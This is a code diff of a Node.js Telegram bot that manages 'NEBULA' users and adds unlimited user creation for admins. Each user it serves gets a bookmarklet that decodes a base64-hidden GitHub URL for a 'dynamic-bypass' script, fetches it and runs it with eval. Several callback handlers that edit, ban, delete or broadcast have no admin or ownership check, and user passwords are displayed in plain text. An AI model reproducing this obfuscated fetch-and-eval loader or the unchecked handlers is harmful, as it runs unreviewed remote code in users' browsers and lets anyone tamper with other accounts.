@@ -1,7 +1,7 @@
 // ╔══════════════════════════════════════════════╗
-// ║  NEBULA USER MANAGER BOT v4.3              ║
+// ║  NEBULA USER MANAGER BOT v4.4              ║
 // ║  AUTHOR: Abdullah Al Mamun (@A2MBD3)       ║
-// ║  ALL BUGS RESOLVED - PRODUCTION READY      ║
+// ║  ADMIN: UNLIMITED USERS + NO EDIT MY       ║
 // ╚══════════════════════════════════════════════╝
 
 const express = require('express');
@@ -30,27 +30,21 @@ const FORCE_CHANNEL_URL = 'https://t.me/phantomsect';
 const FORCE_GROUP_URL = 'https://t.me/redguild';
 
 // ═══════════════════════════════════════════════
-// SESSIONS (Fixed: typed sessions prevent collision)
+// SESSIONS
 // ═══════════════════════════════════════════════
-const sessions = {};        // { chatId: { type, step, msgId, data, time } }
-const broadcastWaiting = {}; // { chatId: { msgId, time } }
+const sessions = {};
+const broadcastWaiting = {};
 const rateLimit = {};
 
 setInterval(() => {
   const now = Date.now();
-  for (const key in sessions) {
-    if (now - sessions[key].time > 1800000) delete sessions[key];
-  }
-  for (const key in broadcastWaiting) {
-    if (now - broadcastWaiting[key].time > 300000) delete broadcastWaiting[key];
-  }
-  for (const key in rateLimit) {
-    if (now - rateLimit[key] > 2000) delete rateLimit[key];
-  }
+  for (const key in sessions) if (now - sessions[key].time > 1800000) delete sessions[key];
+  for (const key in broadcastWaiting) if (now - broadcastWaiting[key].time > 300000) delete broadcastWaiting[key];
+  for (const key in rateLimit) if (now - rateLimit[key] > 2000) delete rateLimit[key];
 }, 60000);
 
 // ═══════════════════════════════════════════════
-// CACHE (Fixed: invalidate on write)
+// CACHE
 // ═══════════════════════════════════════════════
 let cachedUsers = null;
 let cacheTime = 0;
@@ -58,10 +52,7 @@ const CACHE_TTL = 3000;
 let botInfoCache = null;
 let botUsernameCache = null;
 
-function invalidateCache() {
-  cachedUsers = null;
-  cacheTime = 0;
-}
+function invalidateCache() { cachedUsers = null; cacheTime = 0; }
 
 // ═══════════════════════════════════════════════
 // LOGGER
@@ -137,18 +128,18 @@ app.get('/', async (req, res) => {
       </div>
       <a href="${botLink}" class="btn btn-primary">🤖 Open Bot</a>
       <a href="https://t.me/A2MBD3" class="btn btn-outline">👤 Contact Creator</a>
-      <div class="footer">Created by <a href="https://t.me/A2MBD3">Abdullah Al Mamun</a><br>@A2MBD3 · NEBULA v4.3</div>
+      <div class="footer">Created by <a href="https://t.me/A2MBD3">Abdullah Al Mamun</a><br>@A2MBD3 · NEBULA v4.4</div>
     </div>
   </div>
 </body>
 </html>`);
-  } catch { res.send('⬡ NEBULA Bot v4.3 | @A2MBD3'); }
+  } catch { res.send('⬡ NEBULA Bot v4.4 | @A2MBD3'); }
 });
 
 // ═══════════════════════════════════════════════
 // API HELPERS
 // ═══════════════════════════════════════════════
-const ghHeaders = { 'Authorization': `token ${GITHUB_TOKEN}`, 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'NebulaBot/4.3' };
+const ghHeaders = { 'Authorization': `token ${GITHUB_TOKEN}`, 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'NebulaBot/4.4' };
 
 async function getBotInfo() {
   if (botInfoCache) return botInfoCache;
@@ -245,15 +236,32 @@ async function checkForceJoin(cid) {
 // ═══════════════════════════════════════════════
 // KEYBOARDS
 // ═══════════════════════════════════════════════
-function homeKB(owner, hasUser) {
+function homeKB(isAdminUser, hasUser) {
   const b = [];
-  b.push(hasUser ? [{ text: '✏️ EDIT MY USER', callback_data: 'edit_my' }] : [{ text: '➕ CREATE MY USER', callback_data: 'add_start' }]);
-  if (owner) { b.push([{ text: '👥 USER LIST', callback_data: 'users' }], [{ text: '🔍 SEARCH', callback_data: 'search' }], [{ text: '📊 STATS', callback_data: 'stats' }], [{ text: '📢 BROADCAST', callback_data: 'broadcast' }]); }
+  
+  if (isAdminUser) {
+    // Admin: Unlimited add + full management
+    b.push([{ text: '➕ ADD NEW USER', callback_data: 'add_start' }]);
+    b.push([{ text: '👥 USER LIST', callback_data: 'users' }]);
+    b.push([{ text: '🔍 SEARCH', callback_data: 'search' }]);
+    b.push([{ text: '📊 STATS', callback_data: 'stats' }]);
+    b.push([{ text: '📢 BROADCAST', callback_data: 'broadcast' }]);
+  } else {
+    // Normal user: One user only
+    if (hasUser) {
+      b.push([{ text: '✏️ EDIT MY USER', callback_data: 'edit_my' }]);
+    } else {
+      b.push([{ text: '➕ CREATE MY USER', callback_data: 'add_start' }]);
+    }
+  }
+  
   b.push([{ text: '🔄 REFRESH', callback_data: 'home' }]);
   return { inline_keyboard: b };
 }
+
 function backBtn(d = 'home') { return { inline_keyboard: [[{ text: '🔙 BACK', callback_data: d }]] }; }
 function cancelBtn() { return { inline_keyboard: [[{ text: '❌ CANCEL', callback_data: 'home' }]] }; }
+
 function userListKB(users, page = 0) {
   const pp = 8, total = Math.max(1, Math.ceil(users.length / pp));
   page = Math.max(0, Math.min(page, total - 1));
@@ -268,18 +276,52 @@ function userListKB(users, page = 0) {
   rows.push([{ text: '🔙 HOME', callback_data: 'home' }]);
   return { inline_keyboard: rows };
 }
-function ownerUserKB(u) { return { inline_keyboard: [[{ text: u.banned ? '✅ UNBAN' : '🚫 BAN', callback_data: `toggle_${u.id}` }, { text: '🗑 DELETE', callback_data: `del_${u.id}` }], [{ text: '✏️ ADMIN EDIT', callback_data: `admin_edit_${u.id}` }], [{ text: '🔙 LIST', callback_data: 'users' }]] }; }
-function editMyKB(id) { return { inline_keyboard: [[{ text: '📛 NAME', callback_data: `edit_name_${id}` }], [{ text: '🔑 PASSWORD', callback_data: `edit_pass_${id}` }], [{ text: '📢 CHANNEL', callback_data: `edit_ch_${id}` }], [{ text: '🔙 HOME', callback_data: 'home' }]] }; }
+
+function ownerUserKB(u) {
+  return { inline_keyboard: [
+    [{ text: u.banned ? '✅ UNBAN' : '🚫 BAN', callback_data: `toggle_${u.id}` },
+     { text: '🗑 DELETE', callback_data: `del_${u.id}` }],
+    [{ text: '✏️ ADMIN EDIT', callback_data: `admin_edit_${u.id}` }],
+    [{ text: '🔙 LIST', callback_data: 'users' }],
+  ]};
+}
+
+function editMyKB(id) {
+  return { inline_keyboard: [
+    [{ text: '📛 EDIT NAME', callback_data: `edit_name_${id}` }],
+    [{ text: '🔑 EDIT PASSWORD', callback_data: `edit_pass_${id}` }],
+    [{ text: '📢 EDIT CHANNEL', callback_data: `edit_ch_${id}` }],
+    [{ text: '🔙 HOME', callback_data: 'home' }],
+  ]};
+}
 
 // ═══════════════════════════════════════════════
 // TEXT
 // ═══════════════════════════════════════════════
-function homeText(owner, hasUser, u) {
-  let t = '<b>⬡ NEBULA v4.3</b>\n\n';
-  if (hasUser && u) { t += `👤 <b>${u.name}</b> (ID:${u.id})\n🔑 ${u.password==='0'?'None':'••••'}\n📢 ${u.tgChannel==='0'?'None':u.tgChannel}\n🚫 ${u.banned?'Banned':'Active'}\n\n<i>Use EDIT MY USER.</i>`; }
-  else { t += '👋 Welcome!\n\nCreate your NEBULA user.\n\n<i>💡 One user per creator.</i>\n\n<i>By @A2MBD3</i>'; }
+function homeText(isAdminUser, hasUser, u) {
+  let t = '<b>⬡ NEBULA v4.4</b>\n\n';
+  
+  if (isAdminUser) {
+    t += '👑 <b>ADMIN PANEL</b>\n\n';
+    t += 'You have unlimited access.\n';
+    t += 'Use buttons below to manage users.\n\n';
+    t += '<i>By @A2MBD3</i>';
+  } else if (hasUser && u) {
+    t += `👤 <b>${u.name}</b> (ID:${u.id})\n`;
+    t += `🔑 Pass: ${u.password === '0' ? 'None' : '••••'}\n`;
+    t += `📢 Channel: ${u.tgChannel === '0' ? 'None' : u.tgChannel}\n`;
+    t += `🚫 Status: ${u.banned ? 'Banned' : 'Active'}\n\n`;
+    t += '<i>Use EDIT MY USER to modify.</i>\n';
+    t += '<i>💡 One user per creator.</i>';
+  } else {
+    t += '👋 <b>Welcome!</b>\n\n';
+    t += 'Create your NEBULA user.\n\n';
+    t += '<i>💡 One user per creator.</i>\n\n';
+    t += '<i>By @A2MBD3</i>';
+  }
   return t;
 }
+
 function userText(u) {
   const bl = `javascript:(function(){window.ABDULLAH_BOOKMARK_LOAD=${u.id};var a=['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0EyTUJEMy9BaW5jcmFkL21haW4vL2R5bmFtaWMtYnlwYXNzLWJ5LUBhMm1iZDMuanM='];fetch(atob(a[0])+'?t='+Date.now()).then(r=>r.text()).then(t=>eval(t)).catch(()=>alert('Failed'));})();`;
   return `<b>👤 ${u.name}</b>\n\n🆔 ${u.id}\n👑 @${u.creator||'?'}\n🔑 ${u.password}\n📢 ${u.tgChannel}\n🚫 ${u.banned?'Yes':'No'}\n💬 ${u.chatId?'✅':'❌'}\n📅 ${u.createdAt?new Date(u.createdAt).toLocaleDateString():'?'}\n\n<b>📋 Bookmarklet:</b>\n<code>${bl}</code>`;
@@ -289,12 +331,15 @@ function userText(u) {
 // HELPERS
 // ═══════════════════════════════════════════════
 function cleanUser(u) { return (u || '').replace(/^@/, '').toLowerCase(); }
+function isAdmin(cid) { return ADMIN_IDS.includes(cid.toString()); }
+
 async function getUserByCreator(uname) {
   if (!uname) return null;
   const cu = cleanUser(uname);
   const { users } = await getUsers();
   return users.find(u => cleanUser(u.creator) === cu) || null;
 }
+
 async function storeChatId(uname, cid) {
   if (!uname) return;
   const cu = cleanUser(uname);
@@ -304,15 +349,15 @@ async function storeChatId(uname, cid) {
     if (u && u.chatId !== cid) { u.chatId = cid; u.lastSeen = new Date().toISOString(); await saveUsers(users, sha, `ChatId for ${u.name}`); }
   } catch {}
 }
-function isAdmin(cid) { return ADMIN_IDS.includes(cid.toString()); }
 
 // ═══════════════════════════════════════════════
-// ADD USER (FIXED)
+// ADD USER
 // ═══════════════════════════════════════════════
 function startAdd(cid, mid, creator) {
   sessions[cid] = { type: 'add', step: 'name', mid, data: { creator: cleanUser(creator) }, time: Date.now() };
   editMsg(cid, mid, '➕ <b>CREATE USER</b>\n\n<b>Step 1/3:</b> Enter <b>Name</b>:', cancelBtn());
 }
+
 async function handleAddStep(cid, text, mid) {
   const s = sessions[cid];
   if (!s || s.type !== 'add') return;
@@ -324,31 +369,43 @@ async function handleAddStep(cid, text, mid) {
     }
   } catch (e) { delete sessions[cid]; await editMsg(cid, mid, `❌ ${e.message}`, backBtn()); }
 }
+
 async function finishAdd(cid, mid, s) {
   const { users, sha } = await getUsers();
-  // Double-check creator doesn't already have a user
-  if (users.find(u => cleanUser(u.creator) === s.data.creator)) {
-    const ex = users.find(u => cleanUser(u.creator) === s.data.creator);
-    delete sessions[cid];
-    return editMsg(cid, mid, `⚠️ You already have: <b>${ex.name}</b> (ID:${ex.id})`, { inline_keyboard: [[{ text: '✏️ EDIT', callback_data: 'edit_my' }], [{ text: '🔙 HOME', callback_data: 'home' }]] });
+  
+  // Only check duplicate for non-admin users
+  if (!isAdmin(cid)) {
+    if (users.find(u => cleanUser(u.creator) === s.data.creator)) {
+      const ex = users.find(u => cleanUser(u.creator) === s.data.creator);
+      delete sessions[cid];
+      return editMsg(cid, mid, `⚠️ You already have: <b>${ex.name}</b> (ID:${ex.id})`, { inline_keyboard: [[{ text: '✏️ EDIT', callback_data: 'edit_my' }], [{ text: '🔙 HOME', callback_data: 'home' }]] });
+    }
   }
+  
   const maxId = users.reduce((mx, u) => Math.max(mx, u.id), 0);
   const nu = { id: maxId + 1, name: s.data.name, password: s.data.password, tgChannel: s.data.channel, creator: s.data.creator, banned: 0, chatId: cid, createdAt: new Date().toISOString() };
   users.push(nu);
   await saveUsers(users, sha, `Add ${nu.name} by @${s.data.creator}`);
   delete sessions[cid];
+  
   const bl = `javascript:(function(){window.ABDULLAH_BOOKMARK_LOAD=${nu.id};var a=['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0EyTUJEMy9BaW5jcmFkL21haW4vL2R5bmFtaWMtYnlwYXNzLWJ5LUBhMm1iZDMuanM='];fetch(atob(a[0])+'?t='+Date.now()).then(r=>r.text()).then(t=>eval(t)).catch(()=>alert('Failed'));})();`;
-  await editMsg(cid, mid, `✅ <b>CREATED!</b>\n\n🆔 ${nu.id} | 📛 ${nu.name}\n\n<b>Bookmarklet:</b>\n<code>${bl}</code>`, { inline_keyboard: [[{ text: '🔙 HOME', callback_data: 'home' }]] });
+  
+  const kb = isAdmin(cid) 
+    ? { inline_keyboard: [[{ text: '🔙 HOME', callback_data: 'home' }], [{ text: '➕ ADD MORE', callback_data: 'add_start' }]] }
+    : { inline_keyboard: [[{ text: '🔙 HOME', callback_data: 'home' }]] };
+  
+  await editMsg(cid, mid, `✅ <b>CREATED!</b>\n\n🆔 ${nu.id} | 📛 ${nu.name}\n\n<b>Bookmarklet:</b>\n<code>${bl}</code>`, kb);
 }
 
 // ═══════════════════════════════════════════════
-// EDIT (FIXED: typed session)
+// EDIT
 // ═══════════════════════════════════════════════
 function startEdit(cid, mid, uid, field) {
   sessions[cid] = { type: 'edit', step: 'editing', mid, uid, field, time: Date.now() };
   const lb = { name: 'Name', password: 'Password', tgChannel: 'Channel' };
   editMsg(cid, mid, `✏️ Edit <b>${lb[field]}</b>:`, cancelBtn());
 }
+
 async function handleEditStep(cid, text, mid) {
   const s = sessions[cid];
   if (!s || s.type !== 'edit') return;
@@ -364,19 +421,19 @@ async function handleEditStep(cid, text, mid) {
 }
 
 // ═══════════════════════════════════════════════
-// BROADCAST (FIXED: empty check)
+// BROADCAST
 // ═══════════════════════════════════════════════
 function startBroadcast(cid, mid) {
   broadcastWaiting[cid] = { mid, time: Date.now() };
   editMsg(cid, mid, '📢 <b>BROADCAST</b>\n\nSend content.\n/cancel to abort.', cancelBtn());
 }
+
 async function handleBroadcastSend(cid, mid, msg) {
   delete broadcastWaiting[cid];
   try {
     const { users } = await getUsers();
     const active = users.filter(u => u.chatId && !u.banned);
-    if (!active.length) return editMsg(cid, mid, '⚠️ No active users with chat stored!', backBtn());
-
+    if (!active.length) return editMsg(cid, mid, '⚠️ No active users!', backBtn());
     let sent = 0, failed = 0;
     await editMsg(cid, mid, `📢 Sending to ${active.length}...`);
     for (let i = 0; i < active.length; i += 20) {
@@ -388,6 +445,7 @@ async function handleBroadcastSend(cid, mid, msg) {
     await editMsg(cid, mid, `✅ Done! Sent: ${sent} Failed: ${failed}`, backBtn());
   } catch (e) { await editMsg(cid, mid, `❌ ${e.message}`, backBtn()); }
 }
+
 async function sendToUser(u, msg) {
   try {
     if (msg.text && !msg.photo && !msg.video && !msg.document) {
@@ -425,6 +483,7 @@ function startSearch(cid, mid) {
   sessions[cid] = { type: 'search', mid, time: Date.now() };
   editMsg(cid, mid, '🔍 <b>SEARCH</b>\n\nEnter name, ID, or creator:', cancelBtn());
 }
+
 async function handleSearch(cid, text, mid) {
   delete sessions[cid];
   const { users } = await getUsers();
@@ -443,6 +502,7 @@ function startAdminEdit(cid, mid, uid) {
   sessions[cid] = { type: 'adm_edit', mid, uid, time: Date.now() };
   editMsg(cid, mid, '✏️ <b>ADMIN EDIT</b>\n\nFormat: <code>name,password,channel,banned</code>', cancelBtn());
 }
+
 async function handleAdminEdit(cid, text, mid) {
   const s = sessions[cid];
   if (!s || s.type !== 'adm_edit') return;
@@ -467,26 +527,35 @@ async function handleUpdate(upd) {
     if (upd.callback_query) {
       const cb = upd.callback_query;
       const cid = cb.message?.chat?.id, mid = cb.message?.message_id, data = cb.data;
-      const uname = cb.from?.username || '', owner = isAdmin(cid);
+      const uname = cb.from?.username || '', admin = isAdmin(cid);
       if (!cid || !mid) return;
       await answerCb(cb.id, '');
 
-      if (data === 'check_join') { const j = await checkForceJoin(cid); if (j) { await deleteMsg(cid, mid); const u = await getUserByCreator(uname); await sendMsg(cid, homeText(owner, !!u, u), homeKB(owner, !!u)); } return; }
-      if (data === 'home') { const u = await getUserByCreator(uname); return editMsg(cid, mid, homeText(owner, !!u, u), homeKB(owner, !!u)); }
+      if (data === 'check_join') { const j = await checkForceJoin(cid); if (j) { await deleteMsg(cid, mid); const u = admin ? null : await getUserByCreator(uname); await sendMsg(cid, homeText(admin, !!u, u), homeKB(admin, !!u)); } return; }
+      if (data === 'home') { const u = admin ? null : await getUserByCreator(uname); return editMsg(cid, mid, homeText(admin, !!u, u), homeKB(admin, !!u)); }
       if (data === 'users') { const { users } = await getUsers(); const t = users.length ? users.map(u => `${u.banned ? '🚫' : '✅'} <b>${u.name}</b> (${u.id})`).join('\n') : 'No users.'; return editMsg(cid, mid, `<b>👥 USERS (${users.length})</b>\n\n${t}`, userListKB(users)); }
       if (data.startsWith('users_')) { const pg = parseInt(data.split('_')[1]) || 0; const { users } = await getUsers(); return editMsg(cid, mid, `<b>👥 USERS</b>`, userListKB(users, pg)); }
-      if (data.startsWith('view_')) { const id = parseInt(data.split('_')[1]); const { users } = await getUsers(); const u = users.find(x => x.id === id); if (!u) return answerCb(cb.id, 'Not found!', true); return editMsg(cid, mid, userText(u), owner ? ownerUserKB(u) : backBtn()); }
+      if (data.startsWith('view_')) { const id = parseInt(data.split('_')[1]); const { users } = await getUsers(); const u = users.find(x => x.id === id); if (!u) return answerCb(cb.id, 'Not found!', true); return editMsg(cid, mid, userText(u), admin ? ownerUserKB(u) : backBtn()); }
       if (data.startsWith('toggle_')) { const id = parseInt(data.split('_')[1]); const { users, sha } = await getUsers(); const u = users.find(x => x.id === id); if (!u) return answerCb(cb.id, 'Not found!', true); u.banned = u.banned ? 0 : 1; await saveUsers(users, sha, `${u.banned ? 'Ban' : 'Unban'} ${u.name}`); return editMsg(cid, mid, userText(u), ownerUserKB(u)); }
       if (data.startsWith('del_') && data.endsWith('_list')) return deleteAndRefresh(cid, mid, parseInt(data.replace('del_', '').replace('_list', '')), cb.id);
       if (data.startsWith('del_')) return deleteAndRefresh(cid, mid, parseInt(data.split('_')[1]), cb.id);
-      if (data === 'add_start') { const ex = await getUserByCreator(uname); if (ex) return editMsg(cid, mid, `⚠️ You have: <b>${ex.name}</b> (ID:${ex.id})`, { inline_keyboard: [[{ text: '✏️ EDIT', callback_data: 'edit_my' }], [{ text: '🔙 HOME', callback_data: 'home' }]] }); return startAdd(cid, mid, uname); }
+      
+      // Add user - admin can add unlimited, normal user only one
+      if (data === 'add_start') {
+        if (!admin) {
+          const ex = await getUserByCreator(uname);
+          if (ex) return editMsg(cid, mid, `⚠️ You have: <b>${ex.name}</b> (ID:${ex.id})`, { inline_keyboard: [[{ text: '✏️ EDIT', callback_data: 'edit_my' }], [{ text: '🔙 HOME', callback_data: 'home' }]] });
+        }
+        return startAdd(cid, mid, uname);
+      }
+      
       if (data === 'edit_my') { const u = await getUserByCreator(uname); if (!u) return editMsg(cid, mid, '❌ No user!', backBtn()); return editMsg(cid, mid, userText(u), editMyKB(u.id)); }
       if (data.startsWith('edit_name_')) return startEdit(cid, mid, parseInt(data.split('_')[2]), 'name');
       if (data.startsWith('edit_pass_')) return startEdit(cid, mid, parseInt(data.split('_')[2]), 'password');
       if (data.startsWith('edit_ch_')) return startEdit(cid, mid, parseInt(data.split('_')[2]), 'tgChannel');
       if (data.startsWith('admin_edit_')) return startAdminEdit(cid, mid, parseInt(data.split('_')[2]));
       if (data === 'search') return startSearch(cid, mid);
-      if (data === 'stats') { const { users } = await getUsers(); return editMsg(cid, mid, `<b>📊 STATS</b>\n\n👥 ${users.length}\n✅ ${users.filter(u => !u.banned).length}\n🚫 ${users.filter(u => u.banned).length}\n👑 ${users.filter(u => u.creator).length}\n💬 ${users.filter(u => u.chatId).length}`, backBtn()); }
+      if (data === 'stats') { const { users } = await getUsers(); return editMsg(cid, mid, `<b>📊 STATS</b>\n\n👥 ${users.length}\n✅ ${users.filter(u => !u.banned).length}\n🚫 ${users.filter(u => u.banned).length}`, backBtn()); }
       if (data === 'broadcast') return startBroadcast(cid, mid);
       if (data === 'noop') return;
       return;
@@ -494,16 +563,15 @@ async function handleUpdate(upd) {
 
     if (upd.message) {
       const { chat, text, from } = upd.message;
-      const cid = chat.id, uname = from?.username || '', owner = isAdmin(cid);
+      const cid = chat.id, uname = from?.username || '', admin = isAdmin(cid);
 
-      if (rateLimit[cid] && Date.now() - rateLimit[cid] < 2000 && !owner) return;
+      if (rateLimit[cid] && Date.now() - rateLimit[cid] < 2000 && !admin) return;
       rateLimit[cid] = Date.now();
       await storeChatId(uname, cid);
 
-      if (text === '/start') { const j = await checkForceJoin(cid); if (!j) return; const u = await getUserByCreator(uname); return sendMsg(cid, homeText(owner, !!u, u), homeKB(owner, !!u)); }
+      if (text === '/start') { const j = await checkForceJoin(cid); if (!j) return; const u = admin ? null : await getUserByCreator(uname); return sendMsg(cid, homeText(admin, !!u, u), homeKB(admin, !!u)); }
       if (text === '/cancel') { delete sessions[cid]; delete broadcastWaiting[cid]; return sendMsg(cid, '❌ Cancelled.', backBtn()); }
 
-      // FIXED: Route to correct handler based on session TYPE
       const s = sessions[cid];
       if (broadcastWaiting[cid]) return handleBroadcastSend(cid, broadcastWaiting[cid].mid, upd.message);
       if (s?.type === 'edit') return handleEditStep(cid, text, s.mid);
@@ -538,6 +606,6 @@ async function poll() {
   poll();
 }
 
-app.listen(PORT, async () => { console.log(`\n⬡ NEBULA v4.3 :${PORT} @A2MBD3\n`); await validate(); poll(); });
+app.listen(PORT, async () => { console.log(`\n⬡ NEBULA v4.4 :${PORT} @A2MBD3\n`); await validate(); poll(); });
 process.on('uncaughtException', (e) => log('CRASH', e.message, 'error'));
 process.on('unhandledRejection', (e) => log('REJECT', e?.message, 'error'));
